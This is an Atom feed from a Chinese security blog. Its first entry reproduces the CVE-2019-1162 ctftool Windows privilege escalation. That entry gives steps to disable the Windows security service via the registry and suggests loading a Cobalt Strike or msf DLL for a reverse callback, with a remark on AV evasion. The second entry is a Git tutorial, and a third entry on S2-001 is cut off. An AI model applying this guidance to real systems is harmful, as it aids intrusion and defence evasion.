<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrilic&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://patrilic.top/"/>
  <updated>2019-08-17T01:10:54.125Z</updated>
  <id>http://patrilic.top/</id>
  
  <author>
    <name>Patrilic</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-1162 CTFtool 提权</title>
    <link href="http://patrilic.top/2019/08/17/CVE-2019-1162/"/>
    <id>http://patrilic.top/2019/08/17/CVE-2019-1162/</id>
    <published>2019-08-16T16:03:55.000Z</published>
    <updated>2019-08-17T01:10:54.125Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-17 0:03:55<br><img src="/wallpaper/[130511]鵜飼い-44873217.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a little-known protocol used on Windows to implement Text Services. This might be useful for studying Windows internals, debugging complex issues with Text Input Processors and analyzing Windows security.</span><br></pre></td></tr></table></figure><p>据说通杀xp到win10<br>来自GooleProjectZero的报告：<a href="https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html</a></p><h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>测试版本： <code>Windows 10 1809</code></p><p><img src="/CVE-2019-1162.resources/2AFEC235-3626-4446-B1B5-CE0462059B80.png" alt="449d401cf3dd9aef600033710ed498a2"><br><img src="/CVE-2019-1162.resources/748477CB-5ADC-4D7C-B654-F7BB96AFAC35.png" alt="c70fd3e19082ffeb3204669d1e3ec49d"></p><h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><p>传文件到虚拟机的时候，被Defender拦截了<br><img src="/CVE-2019-1162.resources/5891F28E-EA4E-4BD2-87C5-3CF0610CFA3F.png" alt="17620e7ea3a556734cca6cd2aeabea97"></p><p>由于只是复现一下，就直接关了就行..</p><blockquote><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService</p></blockquote><p>在右侧找到DWORD（32位）值，命名为Start。</p><p>修改数值数据为4</p><p><img src="/CVE-2019-1162.resources/9E06EBB1-BDE7-4FA4-BD18-B8D75C7E6FC0.png" alt="c9c92e378df7e718c39ec5558a31ffc8"><br><img src="/CVE-2019-1162.resources/4FD148D1-B1D5-48C1-A4D0-D5B544492CFF.png" alt="9d68611fbee4ad90a6c40168e986fd26"></p><p>同样可以直接修改dll为<code>cobalt Stike</code>或者<code>msf</code>生成的dll就可以回弹了，简单方便～<br>问题： </p><ol><li>测试win7和win10 1903都可以成功，但是有些环境提示缺少<code>MSVCPxx.dll</code>，需要依赖。</li><li>需要多次交互，建议改源码或者写一键脚本</li><li>特征太明显，需要免杀</li></ol><h2 id="0x03-视频"><a href="#0x03-视频" class="headerlink" title="0x03 视频"></a>0x03 视频</h2><p><a href="https://www.bilibili.com/video/av64061036/" target="_blank" rel="noopener">https://www.bilibili.com/video/av64061036/</a></p><p><iframe width="700" height="550" src="//player.bilibili.com/player.html?aid=64061036&cid=111231293&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe></p><h2 id="0x04-链接"><a href="#0x04-链接" class="headerlink" title="0x04 链接"></a>0x04 链接</h2><p><a href="https://github.com/taviso/ctftool" target="_blank" rel="noopener">https://github.com/taviso/ctftool</a><br><a href="https://www.youtube.com/watch?time_continue=2&amp;v=r3vrzzDpmhc" target="_blank" rel="noopener">https://www.youtube.com/watch?time_continue=2&amp;v=r3vrzzDpmhc</a><br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1162" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1162</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-17 0:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/[130511]鵜飼い-44873217.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 
      
    
    </summary>
    
    
      <category term="Windows提权" scheme="http://patrilic.top/tags/Windows%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>从Learn Git Branching学习Git</title>
    <link href="http://patrilic.top/2019/08/15/%E4%BB%8ELearn%20Git%20Branching%E5%AD%A6%E4%B9%A0Git/"/>
    <id>http://patrilic.top/2019/08/15/从Learn Git Branching学习Git/</id>
    <published>2019-08-15T01:14:11.000Z</published>
    <updated>2019-08-17T01:22:08.683Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-15 09:14:11<br><img src="/wallpaper/62840874_p0.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学学学～，突然发现Git真的是神器。。可惜我以前只会<code>git clone</code>和<code>git pull</code>之类的..</p><p>然后这次打算利用<a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">Learn Git Branching</a>这个网站快速入门Git，做个记录</p><h2 id="0x01-基础篇"><a href="#0x01-基础篇" class="headerlink" title="0x01 基础篇"></a>0x01 基础篇</h2><h3 id="Git-Commit"><a href="#Git-Commit" class="headerlink" title="Git Commit"></a>Git Commit</h3><p>Git 仓库中的提交记录保存的是你的目录下所有文件的快照，就像是把整个目录复制，然后再粘贴一样，但比复制粘贴优雅许多！</p><p>Git 希望提交记录尽可能地轻量，因此在你每次进行提交时，它并不会盲目地复制整个目录。条件允许的情况下，它会将当前版本与仓库中的上一个版本进行对比，并把所有的差异打包到一起作为一个提交记录。</p><p>Git 还保存了提交的历史记录。这也是为什么大多数提交记录的上面都有父节点的原因 —— 我们会在图示中用箭头来表示这种关系。对于项目组的成员来说，维护提交历史对大家都有好处</p><p><code>使用Git commit会将当前节点变成父节点，然后在此基础上生成子节点</code></p><h3 id="Git-branch"><a href="#Git-branch" class="headerlink" title="Git branch"></a>Git branch</h3><p>Git 的分支也非常轻量。它们只是简单地指向某个提交纪录 —— 仅此而已。所以许多 Git 爱好者传颂：</p><p>早建分支！多用分支！</p><p>这是因为即使创建再多分的支也不会造成储存或内存上的开销，并且按逻辑分解工作到不同的分支要比维护那些特别臃肿的分支简单多了。</p><p>在将分支和提交记录结合起来后，我们会看到两者如何协作。现在只要记住使用分支其实就相当于在说：“我想基于这个提交以及它所有的父提交进行新的工作。”</p><p>使用<code>git checkout &lt;name&gt;</code>来切换分支</p><p>如果你想创建一个新的分支同时切换到新创建的分支的话，可以通过 <code>git checkout -b &lt;your-branch-name&gt;</code>来实现。</p><h3 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h3><p>在 Git 中合并两个分支时会产生一个特殊的提交记录，它有两个父节点。翻译成自然语言相当于：“我要把这两个父节点本身及它们所有的祖先都包含进来。”</p><p><img src="/从Learn Git Branching学习Git.resources/2614D1E0-BD73-48F8-B8DB-5F6CEC905F80.png" alt="192ba280fae5ee0fd1f909cff39ead77"></p><p><img src="/从Learn Git Branching学习Git.resources/F58D8E70-4B17-41AA-8742-FD472E1BF94A.png" alt="b26c0aefbbee442bf750ce2f01eae6de"></p><h3 id="Git-Rebase"><a href="#Git-Rebase" class="headerlink" title="Git Rebase"></a>Git Rebase</h3><p>Rebase 实际上就是取出一系列的提交记录，“复制”它们，然后在另外一个地方逐个的放下去。</p><p>Rebase 的优势就是可以创造更线性的提交历史，这听上去有些难以理解。如果只允许使用 Rebase 的话，代码库的提交历史将会变得异常清晰。</p><p><img src="/从Learn Git Branching学习Git.resources/50EA88DF-1C3E-41D1-9840-4E7A01090760.png" alt="18515be24c4a725919c1b94c7a72f606"></p><h2 id="0x02-高级篇"><a href="#0x02-高级篇" class="headerlink" title="0x02 高级篇"></a>0x02 高级篇</h2><h3 id="分离HEAD"><a href="#分离HEAD" class="headerlink" title="分离HEAD"></a>分离HEAD</h3><p>我们首先看一下 “HEAD”。 HEAD 是一个对当前检出记录的符号引用 —— 也就是指向你正在其基础上进行工作的提交记录。</p><p>HEAD 总是指向当前分支上最近一次提交记录。大多数修改提交树的 Git 命令都是从改变 HEAD 的指向开始的。</p><p>HEAD 通常情况下是指向分支名的（如 bugFix）。在你提交时，改变了 bugFix 的状态，这一变化通过 HEAD 变得可见。</p><p><img src="/从Learn Git Branching学习Git.resources/9069213E-F9CD-4FC8-9E74-0B8F0B75A0AA.png" alt="fd0e97c8eaad7c0bb5a6c7c278765c8e"></p><h3 id="相对引用"><a href="#相对引用" class="headerlink" title="相对引用"></a>相对引用</h3><p>通过指定提交记录哈希值的方式在 Git 中移动不太方便。在实际应用时，并没有像本程序中这么漂亮的可视化提交树供你参考，所以你就不得不用 git log 来查查看提交记录的哈希值。</p><p>并且哈希值在真实的 Git 世界中也会更长（译者注：基于 SHA-1，共 40 位）。例如前一关的介绍中的提交记录的哈希值可能是 fed2da64c0efc5293610bdd892f82a58e8cbc5d8。舌头都快打结了吧…</p><p>比较令人欣慰的是，Git 对哈希的处理很智能。你只需要提供能够唯一标识提交记录的前几个字符即可。因此我可以仅输入fed2 而不是上面的一长串字符。</p><p><img src="/从Learn Git Branching学习Git.resources/8F832134-D7A6-46C5-9C19-B2F4E27DE7E1.png" alt="82ea783ee879c7e317d6c81361dead95"></p><p>“~”操作符<br>如果你想在提交树中向上移动很多步的话，敲那么多 ^ 貌似也挺烦人的，Git 当然也考虑到了这一点，于是又引入了操作符 ~。</p><p>该操作符后面可以跟一个数字（可选，不跟数字时与 ^ 相同，向上移动一次），指定向上移动多少次。咱们还是通过实际操作看一下吧</p><p><strong>强制修改分支位置</strong><br>你现在是相对引用的专家了，现在用它来做点实际事情。</p><p>我使用相对引用最多的就是移动分支。可以直接使用 -f 选项让分支指向另一个提交。例如:</p><p>git branch -f master HEAD~3</p><p>上面的命令会将 master 分支强制指向 HEAD 的第 3 级父提交。<br><img src="/从Learn Git Branching学习Git.resources/4509FB0F-B67C-4FF9-BE10-99E53FD8D771.png" alt="f447b9a4564b33261cea73e6216e7c4f"></p><p>这关的练习挺有意思的ahhh</p><h3 id="撤销变更"><a href="#撤销变更" class="headerlink" title="撤销变更"></a>撤销变更</h3><p>在 Git 里撤销变更的方法很多。和提交一样，撤销变更由底层部分（暂存区的独立文件或者片段）和上层部分（变更到底是通过哪种方式被撤销的）组成。我们这个应用主要关注的是后者。</p><p>主要有两种方法用来撤销变更 —— 一是 git reset，还有就是 git revert。接下来咱们逐个进行讲解。<br><img src="/从Learn Git Branching学习Git.resources/77F0A047-20D3-4C7D-9717-A3B7FAB89413.png" alt="d99d76d8f5424fcd99266252dd643b2f"></p><p><img src="/从Learn Git Branching学习Git.resources/E58FC9EC-1CE9-4CA9-9659-BB89197E199D.png" alt="bb4a48b09f3d4801500a97b02668e17d"></p><h2 id="0x03-移动提交记录"><a href="#0x03-移动提交记录" class="headerlink" title="0x03 移动提交记录"></a>0x03 移动提交记录</h2><h3 id="Git-Cherry-pick"><a href="#Git-Cherry-pick" class="headerlink" title="Git Cherry-pick"></a>Git Cherry-pick</h3><p>本系列的第一个命令是 git cherry-pick, 命令形式为:</p><p>git cherry-pick &lt;提交号&gt;…<br>如果你想将一些提交复制到当前所在的位置（HEAD）下面的话， Cherry-pick 是最直接的方式了。我个人非常喜欢 cherry-pick，因为它特别简单。</p><p><img src="/从Learn Git Branching学习Git.resources/3359DD9A-B71C-469C-9D30-045C734CCA6E.png" alt="765027cb3d5707374b46492489d40950"></p><h3 id="交互式的-rebase"><a href="#交互式的-rebase" class="headerlink" title="交互式的 rebase"></a>交互式的 rebase</h3><p>当你知道你所需要的提交记录（并且还知道这些提交记录的哈希值）时, 用 cherry-pick 再好不过了 —— 没有比这更简单的方式了。</p><p>但是如果你不清楚你想要的提交记录的哈希值呢? 幸好 Git 帮你想到了这一点, 我们可以利用交互式的 rebase —— 如果你想从一系列的提交记录中找到想要的记录, 这就是最好的方法了</p><p>交互式 rebase 指的是使用带参数 –interactive 的 rebase 命令, 简写为 -i</p><p>如果你在命令后增加了这个选项, Git 会打开一个 UI 界面并列出将要被复制到目标分支的备选提交记录，它还会显示每个提交记录的哈希值和提交说明，提交说明有助于你理解这个提交进行了哪些更改。</p><p>在实际使用时，所谓的 UI 窗口一般会在文本编辑器 —— 如 Vim —— 中打开一个文件。 考虑到课程的初衷，我弄了一个对话框来模拟这些操作。</p><p>当 rebase UI界面打开时, 你能做3件事:</p><p>调整提交记录的顺序（通过鼠标拖放来完成）<br>删除你不想要的提交（通过切换 pick 的状态来完成，关闭就意味着你不想要这个提交记录）<br>合并提交。 遗憾的是由于某种逻辑的原因，我们的课程不支持此功能，因此我不会详细介绍这个操作。简而言之，它允许你把多个提交记录合并成一个。</p><p><img src="/从Learn Git Branching学习Git.resources/34362025-526B-46E4-BE18-2AA3F840D1DA.png" alt="e36004deb440e13f039d11d45f914336"></p><h2 id="0x04-杂项"><a href="#0x04-杂项" class="headerlink" title="0x04 杂项"></a>0x04 杂项</h2><h3 id="本地栈式提交"><a href="#本地栈式提交" class="headerlink" title="本地栈式提交"></a>本地栈式提交</h3><p>看一个在开发中经常会遇到的情况：我正在解决某个特别棘手的 Bug，为了便于调试而在代码中添加了一些调试命令并向控制台打印了一些信息。</p><p>这些调试和打印语句都在它们各自的提交记录里。最后我终于找到了造成这个 Bug 的根本原因，解决掉以后觉得沾沾自喜！</p><p>最后就差把 bugFix 分支里的工作合并回 master 分支了。你可以选择通过 fast-forward 快速合并到 master 分支上，但这样的话 master 分支就会包含我这些调试语句了。你肯定不想这样，应该还有更好的方式……</p><p>实际我们只要让 Git 复制解决问题的那一个提交记录就可以了。跟之前我们在“整理提交记录”中学到的一样，我们可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i</span><br><span class="line">git cherry-pick</span><br></pre></td></tr></table></figure><p>来达到目的。</p><h3 id="提交的技巧-1"><a href="#提交的技巧-1" class="headerlink" title="提交的技巧 #1"></a>提交的技巧 #1</h3><p>接下来这种情况也是很常见的：你之前在 newImage 分支上进行了一次提交，然后又基于它创建了 caption 分支，然后又提交了一次。</p><p>此时你想对的某个以前的提交记录进行一些小小的调整。比如设计师想修改一下 newImage 中图片的分辨率，尽管那个提交记录并不是最新的了。</p><p>我们可以通过下面的方法来克服困难：</p><ul><li>先用 git rebase -i 将提交重新排序，然后把我们想要修改的提交记录挪到最前</li><li>然后用 commit –amend 来进行一些小修改</li><li>接着再用 git rebase -i 来将他们调回原来的顺序</li><li>最后我们把 master 移到修改的最前端（用你自己喜欢的方法），就大功告成啦！</li></ul><p>当然完成这个任务的方法不止上面提到的一种（我知道你在看 cherry-pick 啦），之后我们会多点关注这些技巧啦，但现在暂时只专注上面这种方法。 最后有必要说明一下目标状态中的那几个<code>&#39;</code> —— 我们把这个提交移动了两次，每移动一次会产生一个 <code>&#39;</code>；而 C2 上多出来的那个是我们在使用了 amend 参数提交时产生的，所以最终结果就是这样了。</p><p>也就是说，我在对比结果的时候只会对比提交树的结构，对于 <code>&#39;</code> 的数量上的不同，并不纳入对比范围内。只要你的 master 分支结构与目标结构相同，我就算你通过。</p><h3 id="提交的技巧-2"><a href="#提交的技巧-2" class="headerlink" title="提交的技巧 #2"></a>提交的技巧 #2</h3><p><img src="/从Learn Git Branching学习Git.resources/9E5623EC-E5BF-4769-BF07-C5CDE2AA2E85.png" alt="3989b7b8ec9346ac016e0b0359f9b2ed"></p><p>使用cherry-pick而不是rebase</p><h3 id="Git-Tags"><a href="#Git-Tags" class="headerlink" title="Git Tags"></a>Git Tags</h3><p>相信通过前面课程的学习你已经发现了：分支很容易被人为移动，并且当有新的提交时，它也会移动。分支很容易被改变，大部分分支还只是临时的，并且还一直在变。</p><p>你可能会问了：有没有什么可以永远指向某个提交记录的标识呢，比如软件发布新的大版本，或者是修正一些重要的 Bug 或是增加了某些新特性，有没有比分支更好的可以永远指向这些提交的方法呢？</p><p>当然有了！Git 的 tag 就是干这个用的啊，它们可以（在某种程度上 —— 因为标签可以被删除后重新在另外一个位置创建同名的标签）永久地将某个特定的提交命名为里程碑，然后就可以像分支一样引用了。</p><p>更难得的是，它们并不会随着新的提交而移动。你也不能检出到某个标签上面进行修改提交，它就像是提交树上的一个锚点，标识了某个特定的位置。</p><p>咱们来看看标签到底是什么样。<br><img src="/从Learn Git Branching学习Git.resources/09E6A8B9-6BF9-4C0C-8285-CD2EA66D021A.png" alt="eda9f37cda3db0a78b41231c2c106bb9"></p><h3 id="Git-Describe"><a href="#Git-Describe" class="headerlink" title="Git Describe"></a>Git Describe</h3><p>由于标签在代码库中起着“锚点”的作用，Git 还为此专门设计了一个命令用来描述离你最近的锚点（也就是标签），它就是 <code>git describe</code>！</p><p><code>Git Describe</code> 能帮你在提交历史中移动了多次以后找到方向；当你用 <code>git bisect</code>（一个查找产生 Bug 的提交记录的指令）找到某个提交记录时，或者是当你坐在你那刚刚度假回来的同事的电脑前时， 可能会用到这个命令。</p><p><img src="/从Learn Git Branching学习Git.resources/A9CEE6D3-F067-4268-BF36-8AA2776538E0.png" alt="699894efdfa9040cca48ef0c1cfebc34"><br><img src="/从Learn Git Branching学习Git.resources/FDF8C289-B2B6-4D18-BABE-AF2B8F6BA68F.png" alt="c477de5a3f6e9599613d42c8625ab11d"></p><h2 id="0x05-Remote"><a href="#0x05-Remote" class="headerlink" title="0x05 Remote"></a>0x05 Remote</h2><h3 id="Git-clone"><a href="#Git-clone" class="headerlink" title="Git clone"></a>Git clone</h3><p><img src="/从Learn Git Branching学习Git.resources/BD9DC00A-8D6E-4F17-89DB-29FEB666B559.png" alt="a95080721b1c67d1f457af6e19d8cbc0"></p><h3 id="Git-Fetch"><a href="#Git-Fetch" class="headerlink" title="Git Fetch"></a>Git Fetch</h3><p>Git 远程仓库相当的操作实际可以归纳为两点：向远程仓库传输数据以及从远程仓库获取数据。既然我们能与远程仓库同步，那么就可以分享任何能被 Git 管理的更新（因此可以分享代码、文件、想法、情书等等）。</p><p>本节课我们将学习如何从远程仓库获取数据 —— 命令如其名，它就是 git fetch。</p><p><img src="/从Learn Git Branching学习Git.resources/C9D0C011-8C0B-4BEF-9F82-173097CE43F9.png" alt="dc0218d0303c3fafc7f46aca13bc1b59"></p><p><img src="/从Learn Git Branching学习Git.resources/95A0815E-7386-4191-9F31-C9B7C4601103.png" alt="14572931af2dccd8b90678de59bc82ca"><br><img src="/从Learn Git Branching学习Git.resources/9FB29388-3E83-4488-81CE-5A428D58D98E.png" alt="2c3550421c09404c240c3f1e7431d304"></p><h3 id="Git-Pull"><a href="#Git-Pull" class="headerlink" title="Git Pull"></a>Git Pull</h3><p><img src="/从Learn Git Branching学习Git.resources/7006473F-F4A1-4A7C-82D7-915364267EF3.png" alt="7e289552cb9d3b6c9c52f44cddd22047"><br><img src="/从Learn Git Branching学习Git.resources/7333D970-4EC4-4036-B55D-BC29FBEA1B33.png" alt="b1ae8cf7f9ef2b9ffbe63519d581aa32"></p><h3 id="Git-fakeTeamwork-master"><a href="#Git-fakeTeamwork-master" class="headerlink" title="Git fakeTeamwork master"></a>Git fakeTeamwork master</h3><p><img src="/从Learn Git Branching学习Git.resources/CA3453C6-DEB1-411C-88E6-D4A558EE9879.png" alt="9b5af660f46f29bfa88c95ae8fafa636"></p><h3 id="Git-Push"><a href="#Git-Push" class="headerlink" title="Git Push"></a>Git Push</h3><p><img src="/从Learn Git Branching学习Git.resources/38A2069A-AB6C-4987-976C-70DA91D8E743.png" alt="1673f41c5be4bba1f7d6ba007b77d2e6"><br><img src="/从Learn Git Branching学习Git.resources/F2BB9EC5-FC8D-4E8B-818F-DE6F0B07060A.png" alt="fb6426cdc6b2a55e9de9852d70c9aaea"></p><h3 id="历史分支（实用）"><a href="#历史分支（实用）" class="headerlink" title="历史分支（实用）"></a>历史分支（实用）</h3><p><img src="/从Learn Git Branching学习Git.resources/C81FACE7-86DC-4F61-8E6B-6797BE791417.png" alt="90a13578ffbb27b78c5996af4fd73fe3"></p><p><img src="/从Learn Git Branching学习Git.resources/C1FD79C4-AF85-4342-B5EF-4687F4369A93.png" alt="25d1261efbb01df45777b0947fc48305"><br><img src="/从Learn Git Branching学习Git.resources/A51EC4C5-2E34-4320-9CBD-F68B7620C464.png" alt="53bb1152ea2586767d47fe0a1e702a84"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">git branch 查看本地所有分支</span><br><span class="line"></span><br><span class="line">git status 查看当前状态</span><br><span class="line"></span><br><span class="line">git commit 提交</span><br><span class="line"></span><br><span class="line">git branch -a 查看所有的分支</span><br><span class="line"></span><br><span class="line">git branch -r 查看远程所有分支</span><br><span class="line"></span><br><span class="line">git commit -am &quot;init&quot; 提交并且加注释</span><br><span class="line"></span><br><span class="line">git remote add origin git@192.168.1.119:ndshow</span><br><span class="line"></span><br><span class="line">git push origin master 将文件给推到服务器上</span><br><span class="line"></span><br><span class="line">git remote show origin 显示远程库origin里的资源</span><br><span class="line"></span><br><span class="line">git push origin master:develop</span><br><span class="line"></span><br><span class="line">git push origin master:hb-dev 将本地库与服务器上的库进行关联</span><br><span class="line"></span><br><span class="line">git checkout --track origin/dev 切换到远程dev分支</span><br><span class="line"></span><br><span class="line">git branch -D master develop 删除本地库develop</span><br><span class="line"></span><br><span class="line">git checkout -b dev 建立一个新的本地分支dev</span><br><span class="line"></span><br><span class="line">git merge origin/dev 将分支dev与当前分支进行合并</span><br><span class="line"></span><br><span class="line">git checkout dev 切换到本地dev分支</span><br><span class="line"></span><br><span class="line">git remote show 查看远程库</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line">git rm 文件名(包括路径) 从git中删除指定文件</span><br><span class="line"></span><br><span class="line">git clone git://github.com/schacon/grit.git 从服务器上将代码给拉下来</span><br><span class="line"></span><br><span class="line">git config --list 看所有用户</span><br><span class="line"></span><br><span class="line">git ls-files 看已经被提交的</span><br><span class="line"></span><br><span class="line">git rm [file name] 删除一个文件</span><br><span class="line"></span><br><span class="line">git commit -a 提交当前repos的所有的改变</span><br><span class="line"></span><br><span class="line">git add [file name] 添加一个文件到git index</span><br><span class="line"></span><br><span class="line">git commit -v 当你用－v参数的时候可以看commit的差异</span><br><span class="line"></span><br><span class="line">git commit -m &quot;This is the message describing the commit&quot; 添加commit信息</span><br><span class="line"></span><br><span class="line">git commit -a -a是代表add，把所有的change加到git index里然后再commit</span><br><span class="line"></span><br><span class="line">git commit -a -v 一般提交命令</span><br><span class="line"></span><br><span class="line">git log 看你commit的日志</span><br><span class="line"></span><br><span class="line">git diff 查看尚未暂存的更新</span><br><span class="line"></span><br><span class="line">git rm a.a 移除文件(从暂存区和工作区中删除)</span><br><span class="line"></span><br><span class="line">git rm --cached a.a 移除文件(只从暂存区中删除)</span><br><span class="line"></span><br><span class="line">git commit -m &quot;remove&quot; 移除文件(从Git中删除)</span><br><span class="line"></span><br><span class="line">git rm -f a.a 强行移除修改后文件(从暂存区和工作区中删除)</span><br><span class="line"></span><br><span class="line">git diff --cached 或 $ git diff --staged 查看尚未提交的更新</span><br><span class="line"></span><br><span class="line">git stash push 将文件给push到一个临时空间中</span><br><span class="line"></span><br><span class="line">git stash pop 将文件从临时空间pop下来</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">git remote add origin git@github.com:username/Hello-World.git</span><br><span class="line"></span><br><span class="line">git push origin master 将本地项目给提交到服务器中</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">git pull 本地与服务器端同步</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">git push (远程仓库名) (分支名) 将本地分支推送到服务器上去。</span><br><span class="line"></span><br><span class="line">git push origin server fix:awesome branch</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">git fetch 相当于是从远程获取最新版本到本地，不会自动merge</span><br><span class="line"></span><br><span class="line">git commit -a -m &quot;log_message&quot; (-a是提交所有改动，-m是加入log信息) 本地修改同步至服务器端 ：</span><br><span class="line"></span><br><span class="line">git branch branch_0.1 master 从主分支master创建branch_0.1分支</span><br><span class="line"></span><br><span class="line">git branch -m branch_0.1 branch_1.0 将branch_0.1重命名为branch_1.0</span><br><span class="line"></span><br><span class="line">git checkout branch_1.0/master 切换到branch_1.0/master分支</span><br><span class="line"></span><br><span class="line">du -hs</span><br><span class="line"></span><br><span class="line">git branch 删除远程branch</span><br><span class="line"></span><br><span class="line">git push origin:branch_remote_name</span><br><span class="line"></span><br><span class="line">git branch -r -d branch_remote_name</span><br><span class="line"></span><br><span class="line">－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line"></span><br><span class="line">初始化版本库，并提交到远程服务器端</span><br><span class="line"></span><br><span class="line">mkdir WebApp</span><br><span class="line"></span><br><span class="line">cd WebApp</span><br><span class="line"></span><br><span class="line">git init本地初始化</span><br><span class="line"></span><br><span class="line">touch README</span><br><span class="line"></span><br><span class="line">git add README添加文件</span><br><span class="line"></span><br><span class="line">git commit -m &apos;first commit&apos;</span><br><span class="line"></span><br><span class="line">git remote add origin git@github.com:patrilic/test.git增加一个远程服务器端</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-15 09:14:11&lt;br&gt;&lt;img src=&quot;/wallpaper/62840874_p0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
    
      <category term="Git" scheme="http://patrilic.top/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>S2-001 调试日记</title>
    <link href="http://patrilic.top/2019/08/15/S2-001%20%E8%B0%83%E8%AF%95%E6%97%A5%E8%AE%B0/"/>
    <id>http://patrilic.top/2019/08/15/S2-001 调试日记/</id>
    <published>2019-08-14T18:11:50.000Z</published>
    <updated>2019-08-16T05:10:40.913Z</updated>
    
